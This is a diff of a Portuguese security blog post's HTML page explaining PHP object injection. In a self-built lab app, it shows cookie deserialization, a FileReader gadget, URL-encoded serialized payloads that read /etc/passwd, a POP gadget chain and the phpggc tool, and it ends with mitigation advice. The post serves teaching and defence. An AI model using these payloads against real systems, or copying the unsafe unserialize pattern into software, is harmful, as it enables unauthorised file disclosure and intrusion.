@@ -7,27 +7,27 @@
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
     <meta name="description" content="TL;DR  Esse artigo introduz e explora brevemente a vulnerabilidade object injection, especificamente na linguagem PHP, através de algumas técnicas conhecidas, mostrando como a simples utilização de um">
-<meta name="keywords" content="security php object-injection owasp phpggc">
+<meta name="keywords" content="security,php,object injection,owasp phpggc,phpggc">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Serialization e Object injection vulnerability - Uma década de exploração">
 <meta property="og:url" content="https://girorme.github.io/2020/08/01/serialization-php-object-injection/index.html">
 <meta property="og:site_name" content="Girorme&#39;s blog">
 <meta property="og:description" content="TL;DR  Esse artigo introduz e explora brevemente a vulnerabilidade object injection, especificamente na linguagem PHP, através de algumas técnicas conhecidas, mostrando como a simples utilização de um">
 <meta property="og:locale" content="en">
-<meta property="og:image" content="https://girorme.github.io/2020/08/01/serialization-php-object-injection/architecture-768432_640.jpg">
-<meta property="og:image" content="https://girorme.github.io/2020/08/01/serialization-php-object-injection/index1.png">
-<meta property="og:image" content="https://girorme.github.io/2020/08/01/serialization-php-object-injection/cookie1.png">
-<meta property="og:image" content="https://girorme.github.io/2020/08/01/serialization-php-object-injection/cookie2.png">
-<meta property="og:image" content="https://girorme.github.io/2020/08/01/serialization-php-object-injection/index2.png">
-<meta property="og:image" content="https://girorme.github.io/2020/08/01/serialization-php-object-injection/paper_pop.png">
-<meta property="og:image" content="https://girorme.github.io/2020/08/01/serialization-php-object-injection/mindblow.gif">
-<meta property="og:image" content="https://girorme.github.io/2020/08/01/serialization-php-object-injection/phpggc.png">
-<meta property="og:image" content="https://girorme.github.io/2020/08/01/serialization-php-object-injection/message-unserialize.png">
-<meta property="og:updated_time" content="2020-12-08T05:24:15.182Z">
+<meta property="og:image" content="https://girorme.github.io/images/architecture-768432_640.jpg">
+<meta property="og:image" content="https://girorme.github.io/images/index1.png">
+<meta property="og:image" content="https://girorme.github.io/images/cookie1.png">
+<meta property="og:image" content="https://girorme.github.io/images/cookie2.png">
+<meta property="og:image" content="https://girorme.github.io/images/index2.png">
+<meta property="og:image" content="https://girorme.github.io/images/paper_pop.png">
+<meta property="og:image" content="https://girorme.github.io/images/mindblow.gif">
+<meta property="og:image" content="https://girorme.github.io/images/phpggc.png">
+<meta property="og:image" content="https://girorme.github.io/images/message-unserialize.png">
+<meta property="og:updated_time" content="2021-02-06T20:25:56.828Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Serialization e Object injection vulnerability - Uma década de exploração">
 <meta name="twitter:description" content="TL;DR  Esse artigo introduz e explora brevemente a vulnerabilidade object injection, especificamente na linguagem PHP, através de algumas técnicas conhecidas, mostrando como a simples utilização de um">
-<meta name="twitter:image" content="https://girorme.github.io/2020/08/01/serialization-php-object-injection/architecture-768432_640.jpg">
+<meta name="twitter:image" content="https://girorme.github.io/images/architecture-768432_640.jpg">
     
     
       
@@ -78,6 +78,8 @@
     <br/>
     <span id="actions">
       <ul>
+        
+        <li><a class="icon" href="/2020/12/17/Elixir-e-o-web-scraping/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
         
         
         <li><a class="icon" href="/2019/09/04/psr-12-pt-br/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
@@ -143,7 +145,7 @@
       
     <div class="article-tag">
         <i class="fas fa-tag"></i>
-        <a class="tag-link" href="/tags/security-php-object-injection-owasp-phpggc/">security php object-injection owasp phpggc</a>
+        <a class="tag-link" href="/tags/object-injection/">object injection</a>, <a class="tag-link" href="/tags/owasp-phpggc/">owasp phpggc</a>, <a class="tag-link" href="/tags/php/">php</a>, <a class="tag-link" href="/tags/phpggc/">phpggc</a>, <a class="tag-link" href="/tags/security/">security</a>
     </div>
 
 
@@ -157,24 +159,24 @@
 <p>Esse artigo introduz e explora brevemente a vulnerabilidade object injection, especificamente na linguagem PHP, através de algumas técnicas conhecidas, mostrando como a simples utilização de uma função pode se tornar o pesadelo de uma aplicação inteira</p>
 </blockquote>
 <h3 id="Agenda"><a href="#Agenda" class="headerlink" title="Agenda"></a>Agenda</h3><ul>
-<li><a href="#">Serialization?</a><ul>
-<li><a href="#">Serializando</a></li>
-<li><a href="#">Onde mora o perigo?</a></li>
+<li>Serialization?<ul>
+<li>Serializando</li>
+<li>Onde mora o perigo?</li>
 </ul>
 </li>
-<li><a href="#">O que é PHP Object Injection</a></li>
-<li><a href="#">Exploração</a><ul>
-<li><a href="#">Preparação</a></li>
-<li><a href="#">Condições necessárias</a></li>
-<li><a href="#">Ataque direto</a></li>
-<li><a href="#">Gadget chains/POP - Property Oriented Programming</a></li>
+<li>O que é PHP Object Injection</li>
+<li>Exploração<ul>
+<li>Preparação</li>
+<li>Condições necessárias</li>
+<li>Ataque direto</li>
+<li>Gadget chains/POP - Property Oriented Programming</li>
 </ul>
 </li>
-<li><a href="#">Onde estamos errando?</a></li>
-<li><a href="#">Créditos e referência</a></li>
+<li>Onde estamos errando?</li>
+<li>Créditos e referência</li>
 </ul>
 <h2 id="Serialization"><a href="#Serialization" class="headerlink" title="Serialization?"></a>Serialization?</h2><p>A prática/funcionalidade de serialização de dados utilizada em linguagens de programação (Java, php, python, etc) permite que um objeto seja representado em um valor que possa ser armazenado/transferido via rede (Texto). Já o ato de deserializar é oposto disso, trazemos essa representação em texto para a forma do dado original (array, objeto, etc). É possível ver a utiliazação em vários pontos de aplicações: Armazenamento/manipulação de cookies de usuários, adicionar vida longa ao estado de sessões, estratégias de caching entre outras coisas</p>
-<div style="text-align:center"><img src="architecture-768432_640.jpg"></div>
+<div style="text-align:center"><img src="/images/architecture-768432_640.jpg"></div>
 
 <h3 id="Serializando"><a href="#Serializando" class="headerlink" title="Serializando"></a>Serializando</h3><p>Para armazenar ou transferir um objeto pela rede utilizamos a função <a href="https://www.php.net/manual/en/function.serialize.php" target="_blank" rel="noopener">serialize</a></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">	<span class="keyword">public</span> $isAdmin;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user = <span class="keyword">new</span> User();</span><br><span class="line">$user-&gt;name = <span class="string">'Rodrigo'</span>;</span><br><span class="line">$user-&gt;isAdmin = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize($user);</span><br></pre></td></tr></table></figure>
@@ -241,30 +243,31 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">savePreferences</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// op, op, op, save data etc</span></span><br><span class="line">        $extraThemes = serialize($_POST[<span class="string">'extra_themes'</span>]);</span><br><span class="line">		setcookie(<span class="string">'extra_themes'</span>, $extraThemes);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>Criei um arquivo php simples que irá trabalhar com esse dado posteriormente:</p>
-<div style="text-align:center"><img src="index1.png"></div>
+<div style="text-align:center"><img src="/images/index1.png"></div>
 
 <p>Basicamente um form onde os dados são enviados para o backend.</p>
 <p>Dentro do projeto que criamos, esse arquivo possui a seguinte estrutura:</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="keyword">__DIR__</span> . <span class="string">'/vendor/autoload.php'</span>; <span class="comment">// IMPORTANTE / Condição 2</span></span><br><span class="line">session_start(); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">        &lt;h2&gt;Preferences Form&lt;/h2&gt;</span><br><span class="line">        &lt;form action=<span class="string">"save.php"</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">            &lt;p&gt;</span><br><span class="line">                Name:</span><br><span class="line">                &lt;input name=<span class="string">"name"</span>/&gt;</span><br><span class="line">            &lt;/p&gt;</span><br><span class="line">            &lt;p&gt;</span><br><span class="line">            Theme <span class="number">1</span></span><br><span class="line">            &lt;input name=<span class="string">"theme[]"</span>/&gt;</span><br><span class="line">            Theme <span class="number">2</span></span><br><span class="line">            &lt;input name=<span class="string">"theme[]"</span>/&gt;</span><br><span class="line">            Extra theme (<span class="keyword">use</span> ',' <span class="title">to</span> <span class="title">separate</span> <span class="title">multiples</span>)</span><br><span class="line">            &lt;<span class="title">input</span> <span class="title">name</span>="<span class="title">extra_themes</span>"/&gt;</span><br><span class="line">            &lt;/<span class="title">p</span>&gt;</span><br><span class="line">            &lt;<span class="title">input</span> <span class="title">type</span>="<span class="title">submit</span>" <span class="title">value</span>="<span class="title">Send</span>"/&gt;</span><br><span class="line">        &lt;/<span class="title">form</span>&gt;</span><br><span class="line"></span><br><span class="line">        &lt;<span class="title">div</span>&gt;</span><br><span class="line">            &lt;<span class="title">p</span>&gt;</span><br><span class="line">                <span class="title">Name</span>:</span><br><span class="line">                &lt;?= <span class="title">isset</span>($<span class="title">_SESSION</span>['<span class="title">name</span>']) ? $<span class="title">_SESSION</span>['<span class="title">name</span>'] : '<span class="title">Not</span> <span class="title">defined</span>' ?&gt;</span><br><span class="line">            &lt;/<span class="title">p</span>&gt;</span><br><span class="line">            &lt;<span class="title">p</span>&gt;</span><br><span class="line">                <span class="title">Theme</span>:</span><br><span class="line">                &lt;?= <span class="title">isset</span>($<span class="title">_SESSION</span>['<span class="title">theme</span>']) ? <span class="title">implode</span>(', ', $<span class="title">_SESSION</span>['<span class="title">theme</span>']) : '<span class="title">Not</span> <span class="title">defined</span>' ?&gt;</span><br><span class="line"></span><br><span class="line">                &lt;?= <span class="title">isset</span>($<span class="title">_COOKIE</span>['<span class="title">extra_themes</span>']) ? '&lt;<span class="title">p</span>&gt;<span class="title">Extra</span> <span class="title">themes</span>: ' . <span class="title">unserialize</span>($<span class="title">_COOKIE</span>['<span class="title">extra_themes</span>']) . '&lt;/<span class="title">p</span>&gt;' : '' ?&gt;</span><br><span class="line">            &lt;/<span class="title">p</span>&gt;            </span><br><span class="line">        &lt;/<span class="title">div</span>&gt;</span><br></pre></td></tr></table></figure>
 
-<p>Aqui nosso cookie <code>extra_themes</code> é deserializado de forma nuca e crua:</p>
+<p>Aqui nosso cookie <code>extra_themes</code> é deserializado de forma nua e crua:</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>= <span class="keyword">isset</span>($_COOKIE[<span class="string">'extra_themes'</span>]) ? <span class="string">'&lt;p&gt;Extra themes: '</span> . unserialize($_COOKIE[<span class="string">'extra_themes'</span>]) . <span class="string">'&lt;/p&gt;'</span> : <span class="string">''</span> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p> Então procuramos no sistema algumas classes que fazem sentido e achamos a seguinte classe:</p>
+<p>Com essa informação em mãos, que nosso dado é serializado e passa por <code>unserialize</code>, agora basta achar um vetor de entrada.<br>Então procuramos no sistema algumas classes que fazem sentido, que podem ser utilizadas como vetor e achamos a seguinte classe:</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileReader</span> </span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> $fileName;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (!file_exists(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">"File don't exists"</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>A classe basicamente le o conteúdo do arquivo presente na propriedade <code>$this-&gt;filename</code>.</p>
 <p>Tendo conhecimento da classe acima, poderiamos criar um simples script dentro do projeto para passar valores arbitrários que serão lidos durante o ato de deserialization:</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require_once</span> . <span class="string">'/vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line">$obj = <span class="keyword">new</span> App/FileReader();</span><br><span class="line">$obj-&gt;filename = <span class="string">'/etc/passwd'</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($obj);</span><br></pre></td></tr></table></figure>
 
-<p>O que resulta na seguinte string:</p>
+<p>Aqui ainda fazemos o require do autoload, o que na verdade nem é necessário! Não precisamos desse arquivo funcional, apenas precisamos que a classe existe no sistema alvo.</p>
+<p>o payload acima resulta na seguinte string:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:14:&quot;App\FileReader&quot;:2:&#123;s:11:&quot;*fileName&quot;;N;s:8:&quot;filename&quot;;s:11:&quot;/etc/passwd&quot;;&#125;</span><br></pre></td></tr></table></figure>
 
-<p>Existe um ponto onde na representação dessa string teriamos nullbytes, então um payload ainda mais funcional para ser enviado em uma requisição seria:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$obj = <span class="keyword">new</span> App\FileReader();</span><br><span class="line">$obj-&gt;filename = <span class="string">'../passwd'</span>;</span><br><span class="line">$serialized = serialize($obj);</span><br><span class="line"></span><br><span class="line">$keys = str_split(<span class="string">"%\x00\n\r\t+;"</span>);</span><br><span class="line">$values = array_map(<span class="string">'urlencode'</span>, $keys);</span><br><span class="line">$serialized = str_replace($keys, $values, $serialized);</span><br><span class="line"><span class="keyword">echo</span> $serialized;</span><br></pre></td></tr></table></figure>
+<p>Existe um ponto onde na representação dessa string teriamos nullbytes (Assunto para outro post), então um payload ainda mais funcional para ser enviado em uma requisição seria:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$obj = <span class="keyword">new</span> App\FileReader();</span><br><span class="line">$obj-&gt;filename = <span class="string">'/etc/passwd'</span>;</span><br><span class="line">$serialized = serialize($obj);</span><br><span class="line"></span><br><span class="line">$keys = str_split(<span class="string">"%\x00\n\r\t+;"</span>);</span><br><span class="line">$values = array_map(<span class="string">'urlencode'</span>, $keys);</span><br><span class="line">$serialized = str_replace($keys, $values, $serialized);</span><br><span class="line"><span class="keyword">echo</span> $serialized;</span><br></pre></td></tr></table></figure>
 
 <p>Dessa forma previnimos que nossa string entre quebrada na requisição:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:14:&quot;App\FileReader&quot;:2:&#123;s:11:&quot;%00*%00fileName&quot;%3BN%3Bs:8:&quot;filename&quot;%3Bs:9:&quot;../passwd&quot;%3B&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:14:&quot;App\FileReader&quot;:2:&#123;s:11:&quot;%00*%00fileName&quot;%3BN%3Bs:8:&quot;filename&quot;%3Bs:11:&quot;/etc/passwd&quot;%3B&#125;</span><br></pre></td></tr></table></figure>
 
 <p>Ok! Payload preparado.</p>
 <p>Voltando a nossa aplicação, vamos lembrar que ela:</p>
@@ -274,17 +277,17 @@
 <li>Reutiliza na index caso o mesmo esteja setado, dando um <code>echo</code> diretamente na string serializada:</li>
 </ul>
 <p>Em um cenário de não ataque temos o seguinte conteudo nos cookies:</p>
-<div style="text-align:center"><img src="cookie1.png"></div>
+<div style="text-align:center"><img src="/images/cookie1.png"></div>
 
 <p>Agora como atacantes enviaremos o payload com conteúdo arbitrário:</p>
-<div style="text-align:center"><img src="cookie2.png"></div>
+<div style="text-align:center"><img src="/images/cookie2.png"></div>
 
 <p>Atualizamos a página e….</p>
-<div style="text-align:center"><img src="index2.png"></div>
+<div style="text-align:center"><img src="/images/index2.png"></div>
 
-<p>Booom! <strong>Pwned</strong>. Conseguimos escalar um ataque de <a href="LFD">local-file-inclusion</a> injetando um objeto nos cookies que como é deserializado e “printado” na página, faz com que o método <code>__toString</code> seja executado, com a propriedade alterada e com um valor arbitrário -&gt; <code>/etc/passwd</code>. Nesse caso utilizamos como vetor uma classe vetor que utiliza <code>__toString</code> mas poderiamos usar classes do sistema/vendor que utilizam <code>__destruct</code> ou  <code>__wakeup</code> facilmente. O grande trabalho é apenas encontrar classes que nos deem esse tipo de entrada.</p>
+<p>Booom! <strong>Pwned</strong>. Conseguimos escalar um ataque de <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion" target="_blank" rel="noopener">LFD</a> injetando um objeto nos cookies que como é deserializado e “printado” na página, faz com que o método <code>__toString</code> seja executado, com a propriedade alterada e com um valor arbitrário -&gt; <code>/etc/passwd</code>. Nesse caso utilizamos como vetor uma classe vetor que utiliza <code>__toString</code> mas poderiamos usar classes do sistema/vendor que utilizam <code>__destruct</code> ou  <code>__wakeup</code> facilmente. O grande trabalho é apenas encontrar classes que nos deem esse tipo de entrada.</p>
 <h3 id="Gadget-chains-POP-Property-Oriented-Programming"><a href="#Gadget-chains-POP-Property-Oriented-Programming" class="headerlink" title="Gadget chains/POP - Property Oriented Programming"></a>Gadget chains/POP - Property Oriented Programming</h3><p>Uma outra técnica que é utilizada em muitos ataques que ainda ocorrem hoje em dia mesmo após a primeira citação/paper (<em>Utilizing Code Reuse/ROP in PHP Application Exploits</em>) dez anos atrás e que é muito poderosa e traz consigo algum trabalho de pesquisa. Basicamente é o cenário mostrado anteriormente com steroids!</p>
-<div style="text-align:center"><img src="paper_pop.png"></div>
+<div style="text-align:center"><img src="/images/paper_pop.png"></div>
 
 <p>que é muito parecida com o cenário anterior mas que tem uma particularidade.<br>Através da técnica de Property Oriented Programming fazemos o reuso de classes para que através de propriedades de classes seja possível um ataque como o anterior, nós literalmente pulamos de classe em classe e formamos um caminho válido até o pote de ouro :).</p>
 <p>Podemos imaginar um cenário onde ainda temos nossa classe de <code>FileReader</code> mas que ela só possui o vetor <code>__toString</code>, e temos  em algum momento uma chamada de unserialize em nossos cookies, então um atacante pode se aproveitar de uma outra classe no sistema:</p>
@@ -298,18 +301,18 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">obj = <span class="keyword">new</span> App\UserTheme();</span><br><span class="line">$serialized = serialize($obj);</span><br><span class="line"></span><br><span class="line">$keys = str_split(<span class="string">"%\x00\n\r\t+;"</span>);</span><br><span class="line">$values = array_map(<span class="string">'urlencode'</span>, $keys);</span><br><span class="line">$serialized = str_replace($keys, $values, $serialized);</span><br><span class="line"><span class="keyword">echo</span> $serialized;</span><br></pre></td></tr></table></figure>
 
 <p>Que resulta em:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:13:&quot;App\UserTheme&quot;:1:&#123;s:11:&quot;extraThemes&quot;;O:14:&quot;App\FileReader&quot;:1:&#123;s:8:&quot;fileName&quot;;s:11:&quot;/etc/passwd&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:13:&quot;App\UserTheme&quot;:1:&#123;s:11:&quot;extraThemes&quot;%3BO:14:&quot;App\FileReader&quot;:1:&#123;s:8:&quot;fileN</span><br><span class="line">ame&quot;%3Bs:11:&quot;/etc/passwd&quot;%3B&#125;&#125;</span><br></pre></td></tr></table></figure>
 
-<p>Então conseguimos executar o código que está dentro de <code>App\UserTheme::__toString</code>:</p>
+<p>Então conseguimos executar o código que está dentro de <code>App\UserTheme::__toString</code>, alcançando a injeção de objeto via via um gadget.</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileReader</span> </span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> $fileName;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (!file_exists(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">"File don't exists"</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>A utilização da propridade <code>$this-&gt;extraThemes</code> com um valor arbitrário dentro da classe <code>UserThemes</code> nos permite “triggar” a vulnerabilidade</p>
-<div style="text-align:center"><img src="mindblow.gif"></div>
+<div style="text-align:center"><img src="/images/mindblow.gif"></div>
 
-<p>Então essa vulnerabilidade não se limita apenas ao contexto da aplicação, pelo contrário… é possível abusar de bibliotecas instaladas para que outros tipos de ataques sejam alcançados.<br>E pensando nisso foi criado a ferramenta (<a href="https://github.com/ambionics/phpggc" target="_blank" rel="noopener">phpggc</a> que é especializada nesse tipo de payload utilizando pop, que possui diversas bibliotecas/frameworks de mercado mapeadas. É possível obter diversos payloads com estratégias diversas de encoding/bypass via linha de comando (no qual já contribui :))<br>A ferramenta hoje possui uma vasta quantidade de bibliotecas já mapeadas:</p>
-<div style="text-align:center"><img src="phpggc.png"></div>
+<p>Então essa vulnerabilidade não se limita apenas ao contexto da aplicação, pelo contrário… é possível abusar de bibliotecas instaladas para que outros tipos de ataques sejam alcançados.<br>E pensando nisso foi criado a ferramenta (<a href="https://github.com/ambionics/phpggc" target="_blank" rel="noopener">phpggc</a> que é especializada nesse tipo de payload utilizando as mais diversas técnicas com gadget chains, que possui diversas bibliotecas/frameworks de mercado mapeadas. É possível obter diversos payloads com estratégias diversas de encoding/bypass via linha de comando (no qual já contribui :))<br>A ferramenta hoje possui uma vasta quantidade de bibliotecas já mapeadas:</p>
+<div style="text-align:center"><img src="/images/phpggc.png"></div>
 
-<h2 id="Onde-estamos-errando"><a href="#Onde-estamos-errando" class="headerlink" title="Onde estamos errando?"></a>Onde estamos errando?</h2><div style="text-align:center"><img src="message-unserialize.png"></div>
+<h2 id="Onde-estamos-errando"><a href="#Onde-estamos-errando" class="headerlink" title="Onde estamos errando?"></a>Onde estamos errando?</h2><div style="text-align:center"><img src="/images/message-unserialize.png"></div>
 
 <p>Essa mensagem quando entramos na documentação da função unserialize nos deixa bem claro que <strong>NUNCA</strong> devemos confiar no input do usuário. Caso seja possível, sempre utilize <code>json_encode</code> e funções relacionadas para trabalhar com estado de dados.</p>
 <p>Unserialize pode ser muito perigoso!</p>
@@ -375,7 +378,7 @@
     Copyright &copy;
     
     
-    2017-2020
+    2017-2021
     Girorme
   </div>
   <div class="footer-right">
